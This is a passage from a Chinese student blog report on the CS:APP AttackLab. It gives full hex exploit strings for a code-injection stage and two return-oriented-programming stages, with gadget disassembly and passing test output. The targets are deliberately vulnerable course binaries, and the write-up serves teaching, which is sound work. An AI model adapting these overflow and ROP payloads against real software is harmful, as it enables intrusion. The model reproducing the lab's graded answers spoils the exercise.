0</span><br></pre></td></tr></table></figure><br>我们可以注意到，在函数touch3调用函数hexmatch的前后，0x5561dc90指向的内存并不是我们一开始注入的cookie的字符串表示，而是被填充了其他的数据。这是由于调用新的函数（hexmatch以及hexmatch调用的函数）使得栈帧继续向下增长，从而覆盖了原先我们注入的数据的原因。</p>
<p>我们可以在gdb中实际的运行一下ctarget来得出执行hexmatch函数到底会覆盖多少栈空间，然后根据结果重写我们的攻击代码。<br>但是我在这里采用了另外一种方法是直接将cookie的字符串表示写到攻击代码的最后，这样，这段字符串将会处于相对的高地址，由于栈的增长方向是从高地址到低地址，这样，注入的字符串将绝对不会因函数调用而被覆盖。</p>
<p>最终，我们的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30 /* 前40个字节 */</span><br><span class="line">a8 dc 61 55 00 00 00 00 /* 返回地址 指向下8个字节 */</span><br><span class="line">bf c0 dc 61 55 48 83 c4</span><br><span class="line">10 c3 00 00 00 00 00 00 /* 攻击代码 其中将%rdi指向字符串的首地址（栈的高地址）*/</span><br><span class="line">fa 18 40 00 00 00 00 00 /* 返回地址 指向函数touch3 */</span><br><span class="line">35 39 62 39 39 37 66 61 /* cookie的字符串表示 共9个字节（包括<span class="string">'/0'</span>） */</span><br><span class="line">00</span><br></pre></td></tr></table></figure><br>用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/ctarget/level3/level3.txt|./hex2raw|./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(<span class="string">"59b997fa"</span>)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:ctarget:3:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 A8 DC 61 55 00 00 00 00 BF C0 DC 61 55 48 83 C4 10 C3 00 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure><br>本阶段完成。</p>
<h3 id="第二部分-返回导向编程（Return-Oriented-Programming）攻击"><a href="#第二部分-返回导向编程（Return-Oriented-Programming）攻击" class="headerlink" title="第二部分 返回导向编程（Return-Oriented Programming）攻击"></a>第二部分 返回导向编程（Return-Oriented Programming）攻击</h3><p>为了对抗缓冲区溢出攻击，现代编译器和操作系统采用了很多机制。第二部分的目标文件rtarget就采用了以下两种技术：</p>
<ul>
<li>栈随机化技术，每一次运行程序时，栈的起始位置都是不固定的，几乎不可能确定你攻击代码在栈上的位置。</li>
<li>禁止执行栈上的代码，所以当你尝试将PC指向栈段的时候，程序只能因Segmentation Fault而退出。</li>
</ul>
<p>下面我们引入返回导向编程（Return-Oriented Programming）技术来实现在以上两种限制情况下执行代码。</p>
<p>C语言程序是由若干的函数组成的，每一个函数都以ret结束，下面我们给出一个函数，如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">setval_210</span><span class="params">(<span class="keyword">unsigned</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	*p = <span class="number">3347663060U</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>以及这个函数的反汇编结果，如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000400f15 &lt;setval_210&gt;:</span><br><span class="line">400f15:		c7 <span class="number">07</span> d4 <span class="number">48</span> <span class="number">89</span> c7	movl	<span class="number">$0</span>xc78948d4,(%rdi)</span><br><span class="line">400f1b:		c3					retq</span><br></pre></td></tr></table></figure></p>
<p>尽管栈随机化以及禁止在栈段执行代码，但是通过缓冲区溢出攻击，我们仍然可以覆盖返回地址并且让PC跳转至代码段的相应位置。例如让getbuf返回后跳转至0x400f15，尽管这看起来并没有什么意义，因为程序的代码和我们攻击的代码的逻辑是不同的，攻击代码和程序已有代码相同的可能性几乎是0。</p>
<p>现在，让我们换一个思路，如果让getbuf返回后跳转到0x400f18，会怎么样呢？</p>
<p>从0x400f18开始的三个字节48 89 c7代表的是movq %rax, %rdi，然后紧跟的c3代表的是ret。在攻击中，这段代码就比movl $0xc78948d4,(%rdi) ret这样的代码更有意义。并且当这段代码执行完毕，ret又迫使程序跳转到下一个返回地址指向的地方。</p>
<p>现在我们可以利用程序本身的代码，构造出一组由不同的返回地址组成的攻击代码，每一个返回地址都指向了一个函数的最末尾的若干字节，由ret结尾。这样，程序就会按照我们设计的顺序依次执行这些代码片段，以达到修改程序行为的结果，这就是返回导向编程。这些代码片段被称作gadget，而这些gadgets共同组成了一个gadget farm。</p>
<h4 id="等级2-1"><a href="#等级2-1" class="headerlink" title="等级2"></a>等级2</h4><p>在阶段4中，我们将重复阶段2的攻击，只是这一次目标文件为rtarget。为了简化期间，在本次实验中，你仅能从gadget farm中利用movq，popq，ret，nop这四种类型的指令以及x86_64的前8个寄存器（%rax-%rdi）的gadget去构造答案。并且在阶段4中，你只能使用farm.c中start_farm()和mid_farm()之间的gadget来实现攻击。</p>
<p>当一个gadget用到了popq指令，它将会从栈中pop数据，因此，你的攻击代码将会同时包括gadget地址以及数据。</p>
<p>阶段4的思路很简单，我们只要首先从栈中将cookie的8位数字pop到一个寄存器中，再使用mov指令将该寄存器的值送入%rdi中，或者更加直接，将cookie从栈中pop至%rdi中，最后再将返回地址设置为touch2即可。具体要看gadget farm中都提供了哪些gadgets。</p>
<p>我们首先观察gadget_farm中的相关gadgets，并决定其是否可以用作攻击。根据上述的思路，我们可以得到两个gadget set_val426及getval_280，它们的反汇编代码如下：<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:       c7 <span class="number">07</span> <span class="number">48</span> <span class="number">89</span> c7 <span class="number">90</span>       movl   <span class="number">$0</span>x90c78948,(%rdi)</span><br><span class="line">  4019c9:       c3						retq  </span><br><span class="line"></span><br><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:       b8 <span class="number">29</span> <span class="number">58</span> <span class="number">90</span> c3          <span class="keyword">mov</span>    <span class="number">$0</span>xc3905829,%eax</span><br><span class="line">  4019cf:       c3                      retq   </span><br></pre></td></tr></table></figure><br>setval_426中的48 89 c7 90 c3可以被解释为mov %rax,%rdi nop ret，而getval_280中的58 90 c3可以被解释为pop %rax nop ret。<br>将这两个gadget结合，即可以得到阶段4的结果，如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30 /* 前40个字节 */</span><br><span class="line">cc 19 40 00 00 00 00 00 /* pop %rax */</span><br><span class="line">fa 97 b9 59 00 00 00 00 /* cookie */</span><br><span class="line">c5 19 40 00 00 00 00 00 /* mov %rax,%rdi */</span><br><span class="line">ec 17 40 00 00 00 00 00 /* touch2 */</span><br></pre></td></tr></table></figure><br>用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/rtarget/level2/level2.txt|./hex2raw|./rtarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 2 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:rtarget:2:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure><br>本阶段完成。</p>
<h4 id="等级3-1"><a href="#等级3-1" class="headerlink" title="等级3"></a>等级3</h4><p>在阶段5中，我们将在rtarget中重复阶段3的攻击，即将目标字符串的首地址作为参数传递给函数touch3。这是所有阶段中最难的一个阶段。</p>
<p>首先，考虑到代码段部分以及栈段部分的地址的高4字节都是0，以及x86下任何以32位寄存器作为目标寄存器的指令都会将该寄存器的高4字节置0，我们同样可以使用movl替代movq。</p>
<p>在本阶段中，我们显然是需要将cookie的字符串表示存入栈段的，这个阶段的核心问题是如何定位该字符串的首地址，在栈地址随机的情况下，这是很难的。</p>
<p>首先想到的是利用mov指令将%rsp的值送入另一个寄存器，但是在执行这样的gadget时，寄存器rsp指向的是下一个gadget的返回地址，而不是字符串的首地址，而如果让其指向字符串的首地址，那么又无法在最后返回到函数touch3。</p>
<p>我在做这个实验的时候，在这里卡了很久。最后才注意到在gadget farm中有一个叫做add_xy的函数，这个函数的功能是将%rdi与%rsi相加并保存至%rax，豁然开朗。做题目（进行攻击）的时候还是不能太死板，一定要充分利用目标程序本身提供的代码，一味地按照固有的套路做有时只会浪费时间和精力。</p>
<p>整个阶段5的思路如下，首先将rsp存入某个寄存器之中，然后再将一个特定的常量pop至另一个寄存器之中，最后将这两个值分别存入%rsi和%rdi，调用add_xy将其相加得到字符串的首地址，并将结果%rax存入%rdi之中，最后再调用函数touch3即可。</p>
<p>受制于gadget的种类，我们可能会用到多个gadget做中转。最终的攻击代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30</span><br><span class="line">30 30 30 30 30 30 30 30 /* 前40个字节 */</span><br><span class="line">06 1a 40 00 00 00 00 00 /* mov %rsp,%rax */</span><br><span class="line">a2 19 40 00 00 00 00 00 /* mov %rax,%rdi &lt;- %rax指向的地址*/</span><br><span class="line">ab 19 40 00 00 00 00 00 /* pop %rax */</span><br><span class="line">48 00 00 00 00 00 00 00 /* offset constant*/</span><br><span class="line">dd 19 40 00 00 00 00 00 /* mov %eax,%edx */</span><br><span class="line">34 1a 40 00 00 00 00 00 /* mov %edx,%ecx */</span><br><span class="line">13 1a 40 00 00 00 00 00 /* mov %ecx,%esi */</span><br><span class="line">d6 19 40 00 00 00 00 00 /* add_xy */</span><br><span class="line">a2 19 40 00 00 00 00 00 /* mov %rax,%rdi */</span><br><span class="line">fa 18 40 00 00 00 00 00 /* touch3 */</span><br><span class="line">35 39 62 39 39 37 66 61 /* cookie的字符串表示 与前面保存的rsp总共差了9条语句 故常量为0x48*/</span><br><span class="line">00</span><br></pre></td></tr></table></figure><br>用hex2raw生成攻击字符串并测试，结果如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">user@BlackDragon ~/C/A/target1&gt; cat solutions/rtarget/level3/level3.txt|./hex2raw|./rtarget -q                </span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(<span class="string">"59b997fa"</span>)</span><br><span class="line">Valid solution <span class="keyword">for</span> level 3 with target rtarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">	user id	bovik</span><br><span class="line">	course	15213-f15</span><br><span class="line">	lab	attacklab</span><br><span class="line">	result	1:PASS:0xffffffff:rtarget:3:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 AB 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00</span><br></pre></td></tr></table></figure><br>本阶段完成。</p>
<blockquote>
<p>注意，在第二部分中，可能使用不同的Gadget去实现相同的攻击效果，答案仅供参考，但并不是唯一的。</p>
</blockquote>
<p>至此，整个实验完成。</p>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>相比与BombLab来说，整个AttackLab总体比较简单，主要需要自行阅读讲义中的材料学习相关的攻击方式并将其运用，考虑到讲义中给出的提示，除了阶段5以外整体不是很难。</p>
<p>在这次实验中，主要的两个问题以及收获：</p>
<ul>
<li>字节序的问题，需要对栈的增长方向以及小端法的字节序加以理解。</li>
<li>ROP攻击要充分利用程序本身，而不是循规蹈矩地盲目寻找Gadgets，这样只会在阶段五卡住。</li>
</ul>

                    
                        

                    
                    
                        <p>
                            <a href="/2017/05/09/深入理解计算机系统AttackLab实验报告/#post-footer" class="postShorten-excerpt_link link">
                                评论和共享
                            </a>
                        </p>
                    
                </div>
            
        </div>
        
    </article>
    
    <div class="pagination-bar">
    <ul class="pagination">
        
        
          <li class="pagination-next">
            <a class="btn btn--default btn--small" href="/tags/实验/page/2/">
              <span>下一页</span>
              <i class="fa fa-angle-right text-base icon-ml"></i>
            </a>
          </li>
        
        <li class="pagination-number">第 1 页 共 2 页</li>
    </ul>
</div>

</section>


                <footer id="footer" class="main-content-wrap">
    <span class="copyrights">
        Copyrights &copy; 2018 码龙黑曜. All Rights Reserved.
    </span>
</footer>

            </div>
            
        </div>
        


    
        
    

<div id="about">
    <div id="about-card">
        <div id="about-btn-close">
            <i class="fa fa-remove"></i>
        </div>
        
            <img id="about-card-picture" src="/assets/images/avatar.jpg" alt="作者的图片"/>
        
            <h4 id="about-card-name">码龙黑曜</h4>
        
            <div id="about-card-bio"><p>iOS开发者/计算机科学/兽人控</p>
</div>
        
        
            <div id="about-card-job">
                <i class="fa fa-briefcase"></i>
                <br/>
                <p>华中科技大学 本科在读</p>

            </div>
        
        
            <div id="about-card-location">
                <i class="fa fa-map-marker"></i>
                <br/>
                Wuhan, China
            </div>
        
    </div>
</div>

        
        
<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
        <!--SCRIPTS-->
<script src="/assets/js/script-feiabjni254mgbxiozwsjblcsiodjqohurk0dcfkq0aooroewq6bvkdnadrg.min.js"></script>
<!--SCRIPTS END-->



    </body>
</html>
